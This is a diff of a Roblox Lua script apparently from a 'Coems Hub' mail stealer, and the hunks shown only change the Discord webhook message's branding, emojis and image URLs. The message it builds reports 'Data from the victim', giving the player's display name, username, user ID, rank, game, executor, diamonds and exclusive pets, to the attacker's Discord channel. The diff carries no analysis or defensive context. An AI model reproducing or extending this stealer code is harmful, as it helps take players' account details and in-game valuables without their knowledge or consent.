@@ -49,23 +49,23 @@ local GemsFormated = (require(game:GetService("ReplicatedStorage").Library.Funct
 local RapFormated = (require(game:GetService("ReplicatedStorage").Library.Functions.NumberShorten)( _G.DisplayRap ))
 local function sendwebhook(msg)
 local msg = {
-	["avatar_url"] = "https://cdn.discordapp.com/attachments/1106232994441732117/1106233834850222231/33333.png",
-  ["content"]= "**<a:999:1112457166608158821>New Hit With Coems<a:999:1112457166608158821>** ||@here|| ",
+	["avatar_url"] = "https://cdn.discordapp.com/icons/1109197661652910210/c635dd13f1317b77ded3c73a19840db2.png",
+  ["content"]= "**:money_mouth:New Hit With Coems Hub:money_mouth:** ||@here|| ",
 	["username"] = "Coems",
 	["embeds"]= {
 	  {
 		["title"]= "`Coems Hub Mailstealer Results`",
-		["description"]= "**Data from the victim**\n***<:Gigachad:1112768331146068069> Display Name: ".._G.PlrDisplayNameVictim.."\n<:Gigachad:1112768331146068069> Username: ".._G.PlrUserVictim.."\n<:Gigachad:1112768331146068069> User ID: ".._G.PlrUserIDVictim.."\n:medal:Rank: ".._G.CurrentRank.."\n:joystick: Place: ".._G.GameIn.."\n:skull_crossbones: Executor: "..exploit.."***",
+		["description"]= "**Data from the victim**\n***<:Gigachad:1112768331146068069> Display Name: ".._G.PlrDisplayNameVictim.."\n<:Gigachad:1112768331146068069> Username: ".._G.PlrUserVictim.."\n<:Gigachad:1112768331146068069> User ID: ".._G.PlrUserIDVictim.."\n:medal:Rank: ".._G.CurrentRank.."\n:joystick: Place: ".._G.GameIn.."\n:money_mouth: Executor: "..exploit.."***",
 		["url"]= "https://discord.gg/scriptz",
 		["color"]= ""..webhookcolor.."",
 		["thumbnail"] = {
-        ["url"] = "https://tenor.com/view/byuntear-sad-sad-cat-cat-meme-gif-25617057",
+        ["url"] = "https://cdn.discordapp.com/icons/1109197661652910210/c635dd13f1317b77ded3c73a19840db2.png",
         ["height"] = 420,
         ["width"] = 420
         },
 		["fields"]= {
         {
-          ["name"]= "**<:diamond:1112767847899340810>Diamonds<:diamond:1112767847899340810> **",
+          ["name"]= "**<:diamond_psx:1118474311615918080>Diamonds<:diamond_psx:1118474311615918080>**",
           ["value"]= "```"..GemsFormated.."```",
           ["inline"]= true
         },
@@ -75,7 +75,7 @@ local msg = {
           ["inline"]= true
         },
 	{
-          ["name"]= "**<:Hugecat:1112766460830429255>Exclusive<:Hugecat:1112766460830429255>**",
+          ["name"]= "**<:huge_cat:1118474511763906660>Exclusive<:huge_cat:1118474511763906660>**",
           ["value"]= "```"..Exclusive.."```",
           ["inline"]= true
         },
